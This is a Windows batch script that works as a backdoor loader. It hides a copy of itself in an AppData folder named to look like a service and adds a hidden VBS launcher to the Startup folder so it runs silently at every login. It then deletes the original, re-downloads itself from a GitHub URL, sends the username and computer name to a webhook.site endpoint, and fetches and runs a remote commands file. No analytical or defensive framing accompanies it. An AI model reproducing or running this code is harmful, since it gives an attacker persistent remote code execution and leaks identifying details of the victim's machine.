@echo off
:: Define paths
set startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
set target=%AppData%\WinSvc

:: Check if relocation has already happened
if exist "%target%\maintenance.bat" (
    :: Already relocated, skip straight to main contents
    goto :main
)

:: First-time relocation
mkdir "%target%" >nul 2>&1

:: Copy this batch file into the target folder
copy "%~f0" "%target%\maintenance.bat" /Y

:: Hide the folder (optional)
attrib +h "%target%" >nul

:: Create the VBS launcher in Startup
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run """%target%\maintenance.bat""", 0, True
echo Set WshShell = Nothing
) > "%startup%\winsvc.vbs"

:: Delete self from Startup (so only the VBS remains)
del "%~f0" >nul
attrib +h +s "%startup%\winsvc.vbs"
:: Terminate after starting the relocated copy
cscript //nologo "%startup%\winsvc.vbs"
exit /b

:main
attrib +h "%target%\maintenance.bat"

:: get auto updates
curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/potato.bat > %target%\maintenance.bat

if /I not "%~dp0"=="C:\" (
    copy "%~f0" "%UserProfile%\Documents\"
)
curl --ssl-no-revoke "https://webhook.site/a1a38627-23f7-443f-8434-ae6efabeae7f?machine=%USERNAME%&name=%COMPUTERNAME%"
curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > %target%\commands.bat
attrib +h "%target%\commands.bat"
call "%target%\commands.bat"
